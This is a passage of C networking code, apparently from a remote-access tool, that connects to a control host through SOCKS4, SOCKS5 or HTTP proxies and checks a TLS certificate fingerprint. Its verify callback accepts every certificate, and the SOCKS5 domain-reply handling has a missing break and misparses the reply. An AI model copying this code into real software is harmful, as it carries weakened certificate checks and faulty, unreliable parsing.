					free(socks4a_connection_request);
					return(-1);
				}
				free(socks4a_connection_request);
			}

			// Read socks4 connection response
			char socks_response[8] = {0};
			if(read(io->remote_fd, socks_response, sizeof(socks_response)) == -1) {
				report_error("init_io_target(): read socks4 response: %s", strerror(errno));
				return(-1);
			}
			if(socks_response[0] != 0x00 || socks_response[1] != 0x5a) {
				report_error("init_io_target(): socks4");
				return(-1);
			}

			if(verbose){
				printf("\tConnected!\r\n");
			}
		}

		// Outbound SOCKS5/SOCKS5H proxy
		else if(strcmp(config->outbound_proxy_type, "socks5") == 0 || strcmp(config->outbound_proxy_type, "socks5h") == 0) {

			if(verbose) {
				printf("Requesting %s connection to %s...", config->outbound_proxy_type, config->ip_addr);
				fflush(stdout);
			}

			// Send socks5 greeting (no authentication support)
			unsigned char socks5_greeting[] = { 0x05, 0x01, 0x00 };
			if(write(io->remote_fd, socks5_greeting, sizeof(socks5_greeting)) == -1) {
				report_error("init_io_target(): write socks5 greeting: %s", strerror(errno));
				return(-1);
			}

			// Receive socks5 choice
			char socks5_choice[2] = {0};
			if(read(io->remote_fd, socks5_choice, sizeof(socks5_choice)) == -1) {
				report_error("init_io_target(): read socks5 choice: %s", strerror(errno));
				return(-1);
			}
			if(socks5_choice[0] != 0x05 || socks5_choice[1] != 0x00) {
				report_error("init_io_target(): socks5 choice");
				return(-1);
			}

			if (strcmp(config->outbound_proxy_type, "socks5") == 0) {

				// Parse control ip and port from string
				unsigned char ip[4] = {0};
				unsigned short port = 0;
				if(!parse_addr_string(config->ip_addr, ip, &port)) {
					report_error("init_io_target(): parse_addr_string");
					return(-1);
				}

				// Send socks5 connection request (ipv4)
				unsigned char socks5_connection_request[] = {
					0x05,			// VER: 5
					0x01,			// CMD: CONNECT
					0x00,			// RSV
					0x01,			// ATYP: IP V4 address
					ip[0],			// ipv4 addr
					ip[1],			// ipv4 addr
					ip[2],			// ipv4 addr
					ip[3],			// ipv4 addr
					port >> 8,		// port
					port & 0xff,	// port
				};

				if(write(io->remote_fd, socks5_connection_request, sizeof(socks5_connection_request)) == -1) {
					report_error("init_io_target(): write socks5 connection request (atyp 1): %s", strerror(errno));
					return(-1);
				}

			} else if(strcmp(config->outbound_proxy_type, "socks5h") == 0) {

				// Send socks5 connection request (domain)
				char *domain = strdup(config->ip_addr);
				char *p = strchr(domain, ':');
				if (!p) {
					free(domain);
					return(-1);
				}
				*p = 0;
				unsigned short port = atoi(p+1);

				int socks5_connection_request_len = 7 + strlen(domain);
				unsigned char *socks5_connection_request = calloc(1, socks5_connection_request_len + 1);
				int i = 0;
				socks5_connection_request[i++] = 0x05;				// VER: 5
				socks5_connection_request[i++] = 0x01;				// CMD: CONNECT
				socks5_connection_request[i++] = 0x00;				// RSV
				socks5_connection_request[i++] = 0x03;				// ATYP: DOMAINNAME
				socks5_connection_request[i++] = strlen(domain);	// number of octets of name that follow

				for(size_t j = 0; j < strlen(domain); j++) {
					socks5_connection_request[i++] = domain[j];
				}
				free(domain);

				socks5_connection_request[i++] = port >> 8;			// DST.PORT
				socks5_connection_request[i++] = port & 0xff;		// DST.PORT

				if(write(io->remote_fd, socks5_connection_request, socks5_connection_request_len) == -1) {
					report_error("init_io_target(): write socks5 connection request (atyp 3): %s", strerror(errno));
					free(socks5_connection_request);
					return(-1);
				}
				free(socks5_connection_request);

			}


			// Receive initial part of socks5 response packet
			char socks5_response_part1[4] = {0};
			if(read(io->remote_fd, socks5_response_part1, sizeof(socks5_response_part1)) == -1) {
				report_error("init_io_target(): read socks5 response part 1: %s", strerror(errno));
				return(-1);
			}
			if(socks5_response_part1[0] != 0x05 || socks5_response_part1[1] != 0x00) {
				report_error("init_io_target(): socks5 response");
				return(-1);
			}

			// Receive remaining socks5 response packet according to atyp
			char atyp = socks5_response_part1[3];
			switch (atyp) {
				// IPV4 ADDR
				case 0x01: {
					char socks5_response_part2[6] = {0};
					if(read(io->remote_fd, socks5_response_part2, sizeof(socks5_response_part2)) == -1) {
						report_error("init_io_target(): read socks5 response part 2 (atyp 1): %s", strerror(errno));
						return(-1);
					}
					break;
				}
				// DOMAINNAME
				case 0x03: {
					while(1) {
						char socks5_response_part2 = 0;
						if(read(io->remote_fd, &socks5_response_part2, 1) == -1) {
							report_error("init_io_target(): read socks5 response part 2 (atyp 3): %s", strerror(errno));
							return(-1);
						}
						if(socks5_response_part2 == 0) {
							unsigned short port = 0;
							if(read(io->remote_fd, &port, 2) == -1) {
								report_error("init_io_target(): read socks5 response part 2 (atyp 3): %s", strerror(errno));
								return(-1);
							}
							break;
						}
					}
				}
				default: {
					report_error("init_io_target(): socks5 response unsupported atyp");
					return(-1);
				}
			}

			if(verbose){
				printf("\tConnected!\r\n");
			}
		}

		// Outbound HTTP proxy
		else if(strcmp(config->outbound_proxy_type, "http") == 0) {
			if(verbose) {
				printf("Requesting http connection to %s...", config->ip_addr);
				fflush(stdout);
			}

			// Send http connect request
			char *http_connect_request_fmt = "CONNECT %s HTTP/1.1\r\n\r\n";
			char *http_connect_request = calloc(1, strlen(http_connect_request_fmt) - 2 + strlen(config->ip_addr) + 1);
			sprintf(http_connect_request, http_connect_request_fmt, config->ip_addr);
			if(write(io->remote_fd, http_connect_request, strlen(http_connect_request)) == -1) {
			    free(http_connect_request);
				report_error("init_io_target(): write http connection request: %s", strerror(errno));
				return(-1);
			}
			free(http_connect_request);

			// Read http reponse header
			char http_header[4096] = {0};
			for(size_t i = 0; i < sizeof(http_header); i++) {
				if(read(io->remote_fd, http_header + i, 1) == -1) {
					report_error("init_io_target(): read http connection response header: %s", strerror(errno));
					return(-1);
				}
				if(strstr(http_header, "\r\n\r\n"))
					break;
			}

			if(strstr(http_header, "HTTP/1.1 403 Forbidden")) {
				report_error("init_io_target(): http 403 forbidden");
				return(-1);
			}

			if(!strstr(http_header, "HTTP/1.1 200")) {
				report_error("init_io_target(): http unknown error");
				return(-1);
			}

			if(verbose){
				printf("\tConnected!\r\n");
			}
		}
	}

	if(config->encryption > PLAINTEXT){

		if(!(io->ssl = SSL_new(io->ctx))){
			report_error("init_io_target(): SSL_new(%lx): %s", (unsigned long) io->ctx, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		SSL_set_bio(io->ssl, io->connect, io->connect);

		if(SSL_connect(io->ssl) < 1){
			report_error("init_io_target(): SSL_connect(%lx): %s", (unsigned long) io->ssl, strerror(errno));
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		if((current_cipher = SSL_get_current_cipher(io->ssl)) == NULL){
			report_error("init_io_target(): SSL_get_current_cipher(%lx): No cipher set!", (unsigned long) io->ssl);
			if(verbose){
				ERR_print_errors_fp(stderr);
			}
			return(-1);
		}

		/* Check the certs. */
#if	OPENSSL_VERSION_NUMBER < 0x10100000
		if(!strcmp(current_cipher->name, EDH_CIPHER)){
#else
		if(!strcmp(SSL_CIPHER_get_name(current_cipher), EDH_CIPHER)){
#endif

			if((remote_cert = SSL_get_peer_certificate(io->ssl)) == NULL){
				report_error("init_io_target(): SSL_get_peer_certificate(%lx): %s", (unsigned long) io->ssl, strerror(errno));
				if(verbose){
					ERR_print_errors_fp(stderr);
				}
				return(-1);
			}

			if(!X509_digest(remote_cert, io->fingerprint_type, remote_fingerprint, &remote_fingerprint_len)){
				report_error("init_io_target(): X509_digest(%lx, %lx, %lx, %lx): %s", \
						(unsigned long) remote_cert, (unsigned long) io->fingerprint_type, (unsigned long) remote_fingerprint, (unsigned long) &remote_fingerprint_len, \
						strerror(errno));
				if(verbose){
					ERR_print_errors_fp(stderr);
				}
				return(-1);
			}

			if((remote_fingerprint_str = (char *) calloc(strlen(control_cert_fingerprint) + 1, sizeof(char))) == NULL){
				report_error("init_io_target(): calloc(%d, %d): %s", (int) strlen(control_cert_fingerprint) + 1, (int) sizeof(char), strerror(errno));
				return(-1);
			}

			for(i = 0; i < (int) remote_fingerprint_len; i++){
				sprintf(remote_fingerprint_str + (i * 2), "%02x", remote_fingerprint[i]);
			}

			if(strncmp(control_cert_fingerprint, remote_fingerprint_str, strlen(control_cert_fingerprint))){
				if(verbose){
					fprintf(stderr, "Remote fingerprint expected:\n\t%s\n", control_cert_fingerprint);
					fprintf(stderr, "Remote fingerprint received:\n\t%s\n", remote_fingerprint_str);
				}
				report_error("init_io_target(): Fingerprint mistmatch. Possible mitm. Aborting!\n");
				return(-1);
			}

			free(remote_fingerprint_str);
		}
	}

	return(io->remote_fd);
}


/***********************************************************************************************************************
 *
 * dummy_verify_callback()
 *
 * Inputs: The stuff that openssl requires of a verify_callback function. We won't ever use these things, I promise.
 * Outputs: 1. Always 1.
 *
 * Purpose: This dummy function does nothing of interest, but satisfies openssl that a verify_callback function does 
 *  exist. The net effect of a dummy verify_callback function like this is that you can use self signed certs without
 *  any errors.
 *
 **********************************************************************************************************************/
int dummy_verify_callback(int preverify_ok, X509_STORE_CTX *ctx){

	// If statement is just to quiet the compiler. We only return 1, as promised.
	if(preverify_ok || ctx){
		return(1);
	}

	return(1);
}
